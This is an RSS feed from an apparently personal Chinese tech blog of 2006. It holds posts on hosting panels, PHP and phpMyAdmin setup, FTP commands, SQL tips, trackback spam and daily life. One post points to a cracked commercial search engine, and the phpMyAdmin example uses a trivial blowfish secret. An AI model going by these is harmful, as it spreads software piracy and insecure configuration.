+webmin的虚拟主机管理模块virtualmin- -
+webmin是一个可运行于Linux/freebsd的web界面的主机管理系统，本身自带以及有人贡献了不少模块
+而virtualmin则是它的一个虚拟主机管理模块，功能如下图：
+webmin官方站： http://www.webmin.com/ virtaulmin站点： http://www.swelltech.com/virtualmin/
+基于php/mysql的虚拟主机控制程序PHPMyWebHosting- -
+PHPMyWebHosting是个开源的，基于php/mysql的虚拟主机控制面板程序，你可以用它建立带有邮箱，mysql支持的多域名虚拟主机 它须建立在Linux/freebsd之上，不支持windows
+安装phpmywebhosting你必须拥有系统管理员(root)权限，并依次安装以下套件：
+MySQL Apache and PHP Postfix Maildrop Courier ProFTPd PHPMyWebHosting
+官方站上有基于各平台详细的安装说明 http://www.ladse.de
+phpmywebhosting下载：http://www.ladse.de/index.php/Files
+SysCP虚拟主机管理系统[全php版]- -
+1.有中文包 2.admin,reseller,client 三级管理 3.全部为php代码构成 4.有不少模块(modules)供选择安装 5.开源，免费（基于GPL） 6.Linux/bsd环境，特别是debian(最初是专为它开发的)
+是德国人写的，有简体中文,英文,法文，德文语言包，是多语言的
+用户界面：
+管理员界面：
+具有以下特性：
+Customer Interface managing email accounts managing email forwarders managing subdomains managing mysql databases managing additional ftp account managing .</description>
+    </item>
+    
+    <item>
+      <title>开源的主机管理系统/虚拟主机控制面板</title>
+      <link>http://example.org/2006/04/30/e5bc80e6ba90e79a84e4b8bbe69cbae7aea1e79086e7b3bbe7bb9fe8999ae68b9fe4b8bbe69cbae68ea7e588b6e99da2e69dbf/</link>
+      <pubDate>Sun, 30 Apr 2006 04:15:04 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/30/e5bc80e6ba90e79a84e4b8bbe69cbae7aea1e79086e7b3bbe7bb9fe8999ae68b9fe4b8bbe69cbae68ea7e588b6e99da2e69dbf/</guid>
+      <description>搜索引擎是为用户提供快速获取网页信息的工具，其主要的功能是系统通过用户输入关键字，检索后端网页数据库，将相关网页的链接和摘要信息反馈给用户。从搜索的范围上一般分为站内网页搜索和全局网页搜索。随着网页数量的急剧增加，搜索引擎已经成为上网查询信息的必须手段，各个大型网站均已经提供网页数据搜索服务，并且出现了许多为大型网站提供专业搜索引擎服务的公司，如为Yahoo提供搜索服务的Google，为新浪网和263等国内网站提供服务的百度公司等。专业的搜索服务费用高而免费的搜索引擎软件基本都是基于英文的检索，所以都不太适合Intranet环境（如校园网等）的需要。 搜索引擎的基本组成一般分为网页收集程序、网页后端数据组织存储、网页数据检索三部分。决定搜索引擎好坏的关键因素是数据查询的响应时间，即如何组织好满足全文检索需要的大量网页数据。 GNU/Linux作为一个优秀的网络操作系统，其发行版本中集成了大量的网络应用软件，如 Web服务器（Apache ＋ PHP）、目录服务器（OpenLDAP）、脚本语言（Perl）、网页收集程序（Wget）等。所以，通过将它们集中进行应用，便可以实现一个简单、高效的搜索引擎服务器。 一、基本组成和使用方法 1、网页数据收集 Wget程序是一个优秀的网页收集程序，它采用多线程设计能够方便地将网站内容镜像到本地目录中，并且能够灵活定制收集网页的类型、递归收集层次、目录限额、收集时间等。通过专用的收集程序完成网页的收集工作，既降低了设计的难度又提高了系统的性能。为了减小本地数据的规模，可只收集能够查询的html文件、txt文件、脚本程序asp和php只使用缺省的结果，而不收集如图形文件或是其他的数据文件。 2、网页数据过滤 由于html文件中存在大量的标记，如
+等，这些标记数据没有实际的搜索价值，所以加入数据库前必须对收集的数据进行过滤。Perl作为广泛使用的脚本语言，拥有非常强大而丰富的程序库，可以方便地完成网页的过滤。通过使用HTML-Parser库可以方便地提取出网页中包含的文字数据、标题数据、链接数据等。该程序库可以在www.cpan.net中下载，并且该网站收集的Perl程序涉及范围之广，远远超出我们的现象。 3、目录服务 目录服务是针对大量数据检索需要开发的服务，最早出现在X.500协议集中，后来扩展到TCP/IP中发展成为LDAP（Lightweight Directory Acess Protocol）协议，其相关的标准为1995年制定的RFC1777和1997年制定的RFC2251等。LDAP协议已经作为工业标准被Sun、Lotus、微软等公司广泛应用到其相关产品中，但是专用的基于Windows平台的目录服务器却较少见，OpenLDAP是免费的运行于Unix系统的目录服务器，其产品的性能优秀，已经被许多的Linux发行版本收集（Redhat、Mandrake等），并且提供了包括C、Perl、PHP等的开发接口。 使用目录服务技术代替普通的关系数据库作为网页数据的后端存取平台主要基于目录服务的技术优势。目录服务简化了数据处理类型，去掉了通用关系数据库的费时的事务机制，而是采用全局替换的策略对数据进行更新，其应用的重点是大量数据的检索服务（一般数据更新和检索的频率比例要求在1:10以上），强调检索速度和全文查询，提供完整的数据备份，非常适合搜索引擎之类服务的需要。从目录服务技术解决问题的重点不难看出其在数据检索上的优势，它的提出时间远远落后于关系数据库的提出时间，实际上反映了根据具体问题优化数据解决方案的原则。这与目前广泛存在的凡是涉及大量数据处理必选SQL Server的处理方法形成鲜明对比。 通过选用成熟的目录服务技术提高网页查询的效率，能够简洁有效地提高数据处理能力。这也充分显示了GNU/Linux系统运行开放软件的优势，毕竟不能方便地获得运行于其他平台的目录服务器。 4、查询程序设计 搜索引擎的前端界面是网页，用户通过在特定的网页中输入关键字提交给Web服务器进行处理。运行在Apache Web服务器上的PHP脚本通过运行其相关ldap函数便可以执行关键字的查询工作。主要进行的工作是根据关键字构造查询、向目录服务器提交查询、显示查询结果等。Linux + Apache + PHP作为广泛使用Web服务器，与WinNT + IIS + ASP相比其性能毫不逊色，在目前的Linux发行版本中都集成了Apache + PHP 以及缺省的ldap、pgsql、imap等模块。 5、计划任务 搜索引擎的网页数据收集、数据过滤、加入目录数据库等工作都应该是自动完成的，在UNIX系统中有cron进程来专门完成按照特定时间调度任务，为了不影响系统的运行，一般可以把这些工作安排到深夜进行。 二、具体步骤和注意事项 1、配置Wget软件 在RedHat 6.2发行版中已经集成了该软件包，可以直接进行安装。将需要镜像的站点地址编辑为一个文件中，通过 -I 参数读入该文件；为镜像的站点指定一个本地下载目录；为了避免内部网中链接的重复引用，一般只镜像该站点内的数据；还可以根据网站的具体情况，指定其镜像的深度。 2、配置Openldap服务 在RedHat 6.2发行版中已经集成了Openldap-1.2.9，其配置文件存放在/etc/openldap的目录中。主要的配置文件是slapd.conf，关键要打开对检索速度至关重要的index选项，可以使用setup工具，将ldap在系统引导后作为缺省服务启动。 Ldap服务可以通过文本文件方式存放数据，即LDIF文件格式。使用此方式可以高效地更新目录服务数据，需要注意LDIF格式是通过空行对数据进行分隔的，并且通过运行ldif2lbm将LDIF格式数据导入目录数据库中时需要暂停目录服务。 3、编制数据过滤和LDIF文件生成脚本 为了方便地过滤网页数据，可以调用Perl的HTML-Parser库函数，该程序包下载后需要进行编译，在eg目录下生成了相关的htext，htitle程序，在Perl中可以通过调用外部程序的方式运行该程序，并对其过滤结果通过重定向的方法生成临时文件。本搜索引擎设计的目录数据属性有dn、link、title、modifydate、contents，其中的dn通过Link进行唯一性标识，将过滤后的网页文本内容通过/usr/sbin/ldif程序进行自动编码后放入LDIF文件中。 基本的LDIF文件格式如下： dn: dc=27jd,dc=zzb objectclass: top objectclass: organization  dn: link= http://freemail.27jd.zzh/index.html, dc=27jd ,dc=zzb link: http://freemail.27jd.zzh/index.html title: Webmail主页 modifydate: 2001年2月8日 contents:: CgpXZWJtYWls1vfSswoKCgoKIKHvoaG7ttOtyrnTw1dlYm1haWzPtc2zoaGh7yDO0t KqyerH69PKz+QhISFPdXRsb29rxeTWw6O6U01UUDogZnJlZW1haWwuMjdqZC56emJQ T1AzOiBmcm VlbWFpbC4yN2pkLnp6YkROUyA6IDExLjk5LjY0Ljiy4srU08O7p6O6bWFpbGd1ZXN00 8O7p7/awe 6jum1haWxndWVzdNLR16Ky4dPDu6cg08O7p8P7OkAgZnJlZW1haWwuMjdqZC56emK/ 2sHuOqChoa AgIKHyzOG5qbf+zvEgofKzo7z7zsrM4iCh8s2o0bbCvKHyICCh8sq1z9bUrcDtIKHywfTR1 LK+of IgofK8vMr1sr/W99Kzsb7Ptc2z08nK1NHpvLzK9bK/zfjC59bQ0MS9qMGius3OrLukCgoK CqAKCg o= objectclass:webpage  基本的slapd.</description>
+    </item>
+    
+    <item>
+      <title>Linux主机重编译（升级）PHP支持GD库</title>
+      <link>http://example.org/2006/04/22/linuxe4b8bbe69cbae9878de7bc96e8af91efbc88e58d87e7baa7efbc89phpe694afe68c81gde5ba93/</link>
+      <pubDate>Sat, 22 Apr 2006 21:54:15 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/22/linuxe4b8bbe69cbae9878de7bc96e8af91efbc88e58d87e7baa7efbc89phpe694afe68c81gde5ba93/</guid>
+      <description>Linux主机重编译PHP支持GD库
+*注意：请确认以下您服务器中Apache的安装路径，如果不是 /usr/local/apache2，则在进行以下安装操作时， 注意修改Apache的安装路径！
+1、以root身份登录Linux主机；
+2、停止Web Server服务，如果使用的是Apache可以通过以下命令停止： shell&amp;gt; /usr/local/apache2/bin/apachectl stop
+3、卸载当前PHP和Zend Optimizer： shell&amp;gt; rm -rf /usr/local/php shell&amp;gt; rm -rf /usr/local/Zend shell&amp;gt; vi /usr/local/apache2/conf/httpd.conf 找到LoadModule phpX_module modules/libphpX.so 其中X是PHP版本（4或者5）一行，并将此行删除，保存退出。
+4、下载安装Discuz! GD库安装包： shell&amp;gt; cd /usr/local/src shell&amp;gt; wget -c http://download.discuz.net/gdinstaller.tar.gz shell&amp;gt; tar xzvf gdinstaller.tar.gz shell&amp;gt; cd GDInstaller shell&amp;gt; ./install.sh
+4、下载PHP 5.1.2： shell&amp;gt; cd /usr/local/src shell&amp;gt; wget -c http://download.discuz.net/php-5.1.2.tar.bz2
+5、解压缩并安装PHP 5.1.2： shell&amp;gt; tar xjvf php-5.1.2.tar.bz2 shell&amp;gt; cd php-5.1.2 shell&amp;gt; ./configure &amp;ndash;prefix=/usr/local/php &amp;ndash;with-apxs2=/usr/local/apache2/bin/apxs &amp;ndash;with-zlib-dir &amp;ndash;with-bz2 &amp;ndash;with-tiff-dir &amp;ndash;with-libxml-dir &amp;ndash;with-gd &amp;ndash;with-freetype-dir &amp;ndash;with-jpeg-dir &amp;ndash;with-png-dir &amp;ndash;with-ttf &amp;ndash;enable-mbstring &amp;ndash;with-mysql &amp;ndash;with-config-file-path=/etc &amp;ndash;disable-ipv6 &amp;ndash;enable-gd-native-ttf *注意：如果MySQL不是以RPM包方式安装的，则需要将上述参数中的&amp;ndash;with-mysql 改为&amp;ndash;with-mysql=/usr/local/mysql shell&amp;gt; make shell&amp;gt; make install shell&amp;gt; cp php.</description>
+    </item>
+    
+    <item>
+      <title>phpMyAdmin 2.8.0.3 安装配置</title>
+      <link>http://example.org/2006/04/22/phpmyadmin-2803-e5ae89e8a385e9858de7bdae/</link>
+      <pubDate>Sat, 22 Apr 2006 21:38:29 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/22/phpmyadmin-2803-e5ae89e8a385e9858de7bdae/</guid>
+      <description>装好新的服务器要装pma 看别人都用这个版本了也装个试试吧
+找开一看和以前的有点不一样
+config.inc.php
+这个文件没了
+看了一下安装说明才知道
+要把./libraries/config.default.php 复制到phpMyAdmin根目录并重命名为config.inc.php
+才可以
+配置如下
+$cfg[&amp;lsquo;PmaAbsoluteUri&amp;rsquo;] = &amp;lsquo;http://www.yourdomain.com/phpMyAdmin&#39;; （写出访问phpMyAdmin的绝对URL）／／其实绑了多个不填也可以的
+$cfg[&amp;lsquo;blowfish_secret&amp;rsquo;] = &amp;lsquo;cookie&amp;rsquo;; （使用cookie加密）
+$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;connect_type&amp;rsquo;] = &amp;lsquo;socket&amp;rsquo;; （以socket方式连接MySQL）
+$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;compress&amp;rsquo;] = TRUE; （启用压缩以提高速度，如果访问不正常请改回FALSE）
+$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;auth_type&amp;rsquo;] = &amp;lsquo;cookie&amp;rsquo;; （使用cookie进行身份验证）
+在linux下要设置文件755
+要不然可能不能运行
+还有就是运行安装程序，看了一下麻烦的很
+在浏览器中运行http://&amp;hellip;./phpMyAdmin/libraries/dbg/setup.php 以向导模式进行安装</description>
+    </item>
+    
+    <item>
+      <title>文件权限</title>
+      <link>http://example.org/2006/04/20/e69687e4bbb6e69d83e99990/</link>
+      <pubDate>Thu, 20 Apr 2006 16:40:08 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/20/e69687e4bbb6e69d83e99990/</guid>
+      <description>检查　ls -laZ　文件或目录
+改变 chcon -t httpd_sys_content_t 文件或目录</description>
+    </item>
+    
+    <item>
+      <title>FTP命令详解</title>
+      <link>http://example.org/2006/04/17/ftpe591bde4bba4e8afa6e8a7a3/</link>
+      <pubDate>Mon, 17 Apr 2006 05:58:08 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/17/ftpe591bde4bba4e8afa6e8a7a3/</guid>
+      <description>FTP命令是Internet用户使用最频繁的命令之一，不论是在DOS还是UNIX操 作系统下使用FTP，都会遇到大量的FTP内部命令。 熟悉并灵活应用FTP的内部 命令，可以大大方便使用者，并收到事半功倍之效。 FTP的命令行格式为： ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息； -n 限制ftp的自动登录，即不使用； .n etrc文件； -d 使用调试方式； -g 取消全局文件名。
+ftp使用的内部命令如下(中括号表示可选项):
+1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如： !ls*.zip.
+2.$ macro-ame[args]：执行宏定义macro-name.
+3.account[password]：提供登录远程系统成功后访问系统资源所需的补 充口令。
+4.append local-file[remote-file]：将本地文件追加到远程系统主机， 若未指定远程系统文件名，则使用本地文件名。
+5.ascii：使用ascii类型传输方式。
+6.bell：每个命令执行完毕后计算机响铃一次。
+7.bin：使用二进制文件传输方式。
+8.bye：退出ftp会话过程。
+9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。
+10.cd remote-dir：进入远程主机目录。
+11.cdup：进入远程主机目录的父目录。
+12.chmod mode file-name：将远程主机文件file-name的存取方式设置为 mode，如： chmod 777 a.out 。
+13.close：中断与远程服务器的ftp会话(与open对应)。
+14.cr：使用asscii方式传输文件时，将回车换行转换为回行。
+15.delete remote-file：删除远程主机文件。
+16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命 令，如： deb up 3，若设为0，表示取消debug。
+17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本 地文件local-file。
+18.disconnection：同close。
+19.form format：将文件传输方式设置为format，缺省为file方式。
+20.get remote-file[local-file]： 将远程主机的文件remote-file传至 本地硬盘的local-file。
+21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名， 同命令行的-g参数。</description>
+    </item>
+    
+    <item>
+      <title>trackback 有罪</title>
+      <link>http://example.org/2006/04/15/trackback-e69c89e7bdaa/</link>
+      <pubDate>Sat, 15 Apr 2006 21:43:46 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/15/trackback-e69c89e7bdaa/</guid>
+      <description>作者: sadly 出自: http://www.phpx.com
+昨天 4ngle 找俺 要俺帮他测试一下trackback防spam的功能：（ 好无聊，原来的那些js早没了，随便套了一个php的httpclient类库给他写了一个， 发现他的程序效果还是不错的。
+我不晓得机制是什么样，我再说一点点。 trackback 和 comment 是不有同的，对吗？ 往下看～
+不知到有没有人考虑过，trackback应该从哪里发出来？ 如果我在一篇blog里引用了你的文章，要对你发出trackback， 那么通常向你的服务器发trackback的应该是我的BSP的服务器， 它的ip地址和trackback里面url的ip地址应该是有一致性的吧？
+如果有一个trackback发出的 ip 地址是 202.108.1.1 , url是 www.abc.com/blog/1.html 但 www.abc.com 的ip地址是 203.121.1.1 那很显然，它大概是伪造的。
+如果你在用一个很大的BSP，那么不排除这种可能性， username0.bsp.com的ip地址是 202.108.1.1 username3.bsp.com的ip地址是 202.108.1.2 username5.bsp.com的ip地址是 202.108.1.3 而系统发trackback的时候使用的是 202.108.1.5 ，因为大的集群里由于负载均衡等等的需要可能 会存在这种分工，进出的ip不一样，但是他们的差异会有多大呢？
+多动脑子，少动嘴：） trackback 没有罪， 开放也没有罪， 但是不爱思考的程序员有罪。
+刚刚在dreamhost测试了一下～ www..com 的ip地址是 64.111××× 而 www..name 的ip地址是 208.××× 用同样的wordpress程序测试，得到的服务器出口的ip是 64.111.*** ，还好，出口的ip是一致的。
+如果改用白名单来控制哪些BSP / IP地址是可信的，那效果估计比过滤关键词，ip，网址之类的要 轻松不少吧， 还有上次说过那个问题 §时间§</description>
+    </item>
+    
+    <item>
+      <title>从trackback说起</title>
+      <link>http://example.org/2006/04/15/e4bb8etrackbacke8afb4e8b5b7/</link>
+      <pubDate>Sat, 15 Apr 2006 21:36:58 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/15/e4bb8etrackbacke8afb4e8b5b7/</guid>
+      <description>作者: sadly 出自: http://www.phpx.com
+前两天在网上逛的时候看到了关于blog里trackback的资料,发现它在设计上是有隐患的, 后来还给某几个知名的网站发了点纪念品, 惹得人家直说我早就知到了,不过这关你屁事. 我对口水战没有什么兴趣. 在此说一点程序设计中我个人认为应该考虑的问题,希望 能够抛砖引玉一下.
+1 连续的数字id 使用数字id来标识一篇资料,比如blog的文章, 这当然最简单,最容易实现的. 因为我们设计 数据库的时候通常都会加一个自增长的id来做唯一标志. 用id来标识很直接, 也不需要 额外的存储空间. 不过这显然不是一个很安全的方式, 象村子用的DZ这个程序 viewthread.php?tid=文章编号 是看帖子.只要跑一个循环就可以把全部的文章都抓到了.被 人抓站当然是难免了,但要是被人乱发帖恐怕就不那么舒服了.
+大家都知道数据库对读是有优化的, 而对于写所能做的事情则很有限. 想一想, 如果有个 程序不停的发帖, 数据库记录疯涨 ,数据不断更新, 那你设计的静态化之类的恐怕是没 什么效果了.
+假如, 我们在数据库里加一个字段 ukey , 设计为唯一的标志, 数据取个随机数好了 当然最好是字母数字混和的长字符串. 现在用 (for $i=起始id;$i&amp;lt;终止id;$i++) 回复第$i个文章 的办法显然是不行了.
+不过还是有办法的. 它可以先抓列表页,然后分析出每个文章的ukey, 之后 再 (for $i=起始值;$i&amp;lt;要发送的数量;$i++) 回复第$all_ukey_array[$i]个文章.
+于是, 我们在回帖的时候给每个文章加上不同的随机识别码. 好了. 现在它只好先抓到 列表页, 然后再抓具体页面并分析出这个文章对应的识别码. 最后 再 ($i=起始值;$i&amp;lt;要发送的数量;$i++) 用识别码$all_seccode_array[$i] 回复第$all_ukey_array[$i]个文章
+看来还是没有解决, 图形验证码浮出了水面, 它确实够安全, 可是图形验证码对于正常使 用的用户是不够友好的, 如果每次发帖都要输一个讨厌的验证码那用户就没什么兴趣了.
+算了,还是放弃它, 用户看一篇文章会看多久然后回复它呢?</description>
+    </item>
+    
+    <item>
+      <title>sql函数截取字符串！</title>
+      <link>http://example.org/2006/04/10/sqle587bde695b0e688aae58f96e5ad97e7aca6e4b8b2efbc81/</link>
+      <pubDate>Mon, 10 Apr 2006 08:06:22 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/10/sqle587bde695b0e688aae58f96e5ad97e7aca6e4b8b2efbc81/</guid>
+      <description>Select Substring(xx,1,2) from TABLE
+select left(xx,2) from TABLE</description>
+    </item>
+    
+    <item>
+      <title>MySQL实现表中取出随机数据</title>
+      <link>http://example.org/2006/04/03/mysqle5ae9ee78eb0e8a1a8e4b8ade58f96e587bae99a8fe69cbae695b0e68dae/</link>
+      <pubDate>Mon, 03 Apr 2006 11:58:38 +0000</pubDate>
+      
+      <guid>http://example.org/2006/04/03/mysqle5ae9ee78eb0e8a1a8e4b8ade58f96e587bae99a8fe69cbae695b0e68dae/</guid>
+      <description>SELECT * FROM table_name ORDER BY rand() LIMIT 5;
+rand在手册里是这么说的: RAND() RAND(N) 返回在范围0到1.0内的随机浮点值。如果一个整数参数N被指定，它被用作种子值。
+mysql&amp;gt; select RAND(); -&amp;gt; 0.5925 mysql&amp;gt; select RAND(20); -&amp;gt; 0.1811 mysql&amp;gt; select RAND(20); -&amp;gt; 0.1811 mysql&amp;gt; select RAND(); -&amp;gt; 0.2079 mysql&amp;gt; select RAND(); -&amp;gt; 0.7888 你不能在一个ORDER BY子句用RAND()值使用列，因为ORDER BY将重复计算列多次。然而在MySQL3.23中，你可以做： SELECT * FROM table_name ORDER BY RAND()，这是有利于得到一个来自SELECT * FROM table1,table2 WHERE a=b AND cSELECT * FROM table_name AS r1 JOIN (SELECT ROUND(RAND() * (SELECT MAX(id) FROM table_name)) AS id) AS r2 WHERE r1.</description>
+    </item>
+    
+    <item>
+      <title>今天才知道INT的最大数是多少</title>
+      <link>http://example.org/2006/03/28/e4bb8ae5a4a9e6898de79fa5e98193inte79a84e69c80e5a4a7e695b0e698afe5a49ae5b091/</link>
+      <pubDate>Tue, 28 Mar 2006 12:31:37 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/28/e4bb8ae5a4a9e6898de79fa5e98193inte79a84e69c80e5a4a7e695b0e698afe5a49ae5b091/</guid>
+      <description>是2147483647
+唉，出了半天错才找到原因</description>
+    </item>
+    
+    <item>
+      <title>一个sql取出了很多数据，用了半天才解决</title>
+      <link>http://example.org/2006/03/22/e4b880e4b8aasqle58f96e587bae4ba86e5be88e5a49ae695b0e68daeefbc8ce794a8e4ba86e58d8ae5a4a9e6898de8a7a3e586b3/</link>
+      <pubDate>Wed, 22 Mar 2006 11:42:08 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/22/e4b880e4b8aasqle58f96e587bae4ba86e5be88e5a49ae695b0e68daeefbc8ce794a8e4ba86e58d8ae5a4a9e6898de8a7a3e586b3/</guid>
+      <description>SELECT t1.*, t2.SortId FROM class_2 AS t1, class_3 AS t2 WHERE t2.SortId = t1.Typeid AND t1.SortId=&amp;rsquo;$id&#39;
+t2.SortId 有多少条取出多少条用这句话终于解决了
+SELECT DISTINCT t1.*, t2.SortId FROM class_2 AS t1, class_3 AS t2 WHERE t2.SortId = t1.Typeid AND t1.SortId=&amp;rsquo;$id&#39;</description>
+    </item>
+    
+    <item>
+      <title>wap网站</title>
+      <link>http://example.org/2006/03/14/wape7bd91e7ab99/</link>
+      <pubDate>Tue, 14 Mar 2006 14:17:27 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/14/wape7bd91e7ab99/</guid>
+      <description>服务器到现在才明白是怎么回是
+等有时间了做一个</description>
+    </item>
+    
+    <item>
+      <title>mysql索引</title>
+      <link>http://example.org/2006/03/14/mysqle7b4a2e5bc95/</link>
+      <pubDate>Tue, 14 Mar 2006 14:12:20 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/14/mysqle7b4a2e5bc95/</guid>
+      <description>现在才知道它的重要性
+但20多记录还是不够快,不知是不是机器的是</description>
+    </item>
+    
+    <item>
+      <title>上班好几天了，没时间写呀</title>
+      <link>http://example.org/2006/03/10/e4b88ae78fade5a5bde587a0e5a4a9e4ba86efbc8ce6b2a1e697b6e997b4e58699e59180/</link>
+      <pubDate>Fri, 10 Mar 2006 10:46:57 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/10/e4b88ae78fade5a5bde587a0e5a4a9e4ba86efbc8ce6b2a1e697b6e997b4e58699e59180/</guid>
+      <description>上学的时侯想着工作，不过现在工作还是很开心的也许是因为做自己想做的事吧
+不过不能上网倒是很郁闷，
+唉有时间在写吧talo的钱也还了
+昨天买了手机卡
+有时间在写吧回去了!</description>
+    </item>
+    
+    <item>
+      <title>IndexU 5.0.1  国外商业搜索引擎汉化破解版</title>
+      <link>http://example.org/2006/03/10/indexu-501-e59bbde5a496e59586e4b89ae6909ce7b4a2e5bc95e6938ee6b189e58c96e7a0b4e8a7a3e78988/</link>
+      <pubDate>Fri, 10 Mar 2006 00:15:36 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/10/indexu-501-e59bbde5a496e59586e4b89ae6909ce7b4a2e5bc95e6938ee6b189e58c96e7a0b4e8a7a3e78988/</guid>
+      <description>http://www.heibai.be 或 http://www.bdlive.cn</description>
+    </item>
+    
+    <item>
+      <title>何使用PHP中的字符串函数</title>
+      <link>http://example.org/2006/03/01/e4bd95e4bdbfe794a8phpe4b8ade79a84e5ad97e7aca6e4b8b2e587bde695b0/</link>
+      <pubDate>Wed, 01 Mar 2006 17:01:06 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/01/e4bd95e4bdbfe794a8phpe4b8ade79a84e5ad97e7aca6e4b8b2e587bde695b0/</guid>
+      <description>**7)nl2br **在字符串中的每一个回车前面加上&amp;quot; &amp;ldquo;.
+**(8)AddSlashes,StripSlashes **分别给字符串中需要加上&amp;quot;&amp;ldquo;才能用于数据库查询的字符加上和去掉&amp;rdquo;&amp;rdquo;.
+**(9)parse_str **将&amp;quot;name1=value1&amp;amp;name2;=value2&amp;amp;&amp;hellip;&amp;ldquo;类型的字符串分析成一些变量.
+例如: parse_str(&amp;ldquo;a=1&amp;amp;b;=2&amp;rdquo;); 生成$a与$b两个变量,值分别为1,2. 如果有两对名字/值的名字部分相同,则后一个的值覆盖前一个的.
+如果这两对的名字尾部都有&amp;rdquo;[]&amp;quot;,例如&amp;quot;a[]=1&amp;amp;a;[]=2&amp;quot;,则生成数组$a,两个元素分别为1,2</description>
+    </item>
+    
+    <item>
+      <title>在北京的感觉</title>
+      <link>http://example.org/2006/03/01/e59ca8e58c97e4baace79a84e6849fe8a789/</link>
+      <pubDate>Wed, 01 Mar 2006 10:13:26 +0000</pubDate>
+      
+      <guid>http://example.org/2006/03/01/e59ca8e58c97e4baace79a84e6849fe8a789/</guid>
+      <description>今天是来到北京的第二天了
+本想支亿中邮去看看可是没找到地址，真是郁闷，去了王俯井也没找到
+今天很累，坐了一天车，不过在北京的感觉确实不错
+就是吃饭贵了点一碗抄饼用了5元还没吃饱
+现在来上网了从现在到明天早上25唉
+在看看工作的事吧
+如果可能的话真想留在这里
+希望。。。。。。</description>
+    </item>
+    
+    <item>
+      <title>apache中.htaccess文件的功能写法</title>
+      <link>http://example.org/2006/02/26/apachee4b8adhtaccesse69687e4bbb6e79a84e58a9fe883bde58699e6b395/</link>
+      <pubDate>Sun, 26 Feb 2006 10:32:08 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/26/apachee4b8adhtaccesse69687e4bbb6e79a84e58a9fe883bde58699e6b395/</guid>
+      <description>.htaccess 文件(或者”分布式配置文件”提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
+子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。
+.htaccess必须以ASCII模式上传，最好将其权限设置为644。
+错误文档的定位
+常用的客户端请求错误返回代码： 401 Authorization Required 403 Forbidden 404 Not Found 405 Method Not Allowed 408 Request Timed Out 411 Content Length Required 412 Precondition Failed 413 Request Entity Too Long 414 Request URI Too Long 415 Unsupported Media Type 常见的服务器错误返回代码： 500 Internal Server Error
+用户可以利用.htaccess指定自己事先制作好的错误提醒页面。一般情况下，人们可以专门设立一个目录，例如errors放置这些页面。然后再.htaccess中，加入如下的指令：
+ErrorDocument 404 /errors/notfound.html ErrorDocument 500 /errors/internalerror.html 一条指令一行。上述第一条指令的意思是对于404，也就是没有找到所需要的文档的时候得显示页面为/errors目录下的notfound.html页面。不难看出语法格式为：
+ErrorDocument 错误代码 /目录名/文件名.扩展名 如果所需要提示的信息很少的话，不必专门制作页面，直接在指令中使用HTML号了，例如下面这个例子：
+ErrorDocument 401 &amp;quot; 你没有权限访问该页面，请放弃！
+&amp;quot; 文档访问的密码保护
+要利用.htaccess对某个目录下的文档设定访问用户和对应的密码，首先要做的是生成一个.htpasswd的文本文档，例如：</description>
+    </item>
+    
+    <item>
+      <title>今天研究WordPress的总结</title>
+      <link>http://example.org/2006/02/26/e4bb8ae5a4a9e7a094e7a9b6wordpresse79a84e680bbe7bb93/</link>
+      <pubDate>Sun, 26 Feb 2006 10:23:28 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/26/e4bb8ae5a4a9e7a094e7a9b6wordpresse79a84e680bbe7bb93/</guid>
+      <description>几个今天发现的plugin
+WordPress Plugin: Recent Updates 最近更新plugin 有些选项可在后台设置,是至今找到比较完美的,应该适用于2.0 http://www.semiologic.com/software/recent-updates/
+WordPress Plugin: Recent Posts 最近发表plugin 有些选项可在后台设置,是至今找到比较完美的,应该适用于2.0 http://www.semiologic.com/software/recent-posts/
+以下是2个关于Tags的plugin,Blogging Pro上还有好多关于Tags的plugin,过后得研究下 WordPress Plugin: Simple Tags 2.0 http://www.broobles.com/scripts/simpletags/ WordPress Plugin: Technorati Tagging of Posts http://www.bloggingpro.com/archives/2006/01/13/technorati-tagging-of-posts/
+WordPress Plugin: Google Analytics Plugin 加入Google Analytics 统计代码这下不必自己修改WordPress程序了 http://www.semiologic.com/software/google-analytics/ WordPress Plugin: Google Analyticator 这个也是关于Google Analytics 统计的 http://cavemonkey50.com/code/google-analyticator/
+WordPress Plugin: Google Adsene Maintenance 似乎是定时关闭Google Adsene的 http://www.jensense.com/archives/2005/12/adsense_will_be.html
+Wordpress 风格 A New Spring 这个风格挺清爽,做得不错,可以二度加工下 http://www.codebymatt.com/blog/?p=21
+再次注明一下这几个WordPress plugin站点
+http://wp-plugins.net/ http://www.bloggingpro.com/archives/category/wordpress-plugins/ 另外发现http://www.semiologic.com网站上的语言栏,哇靠,多语言全自动全文翻译,真COOL,比GOOGLE的翻译还COOL,不知道用的什么翻译引擎,一会再看看.
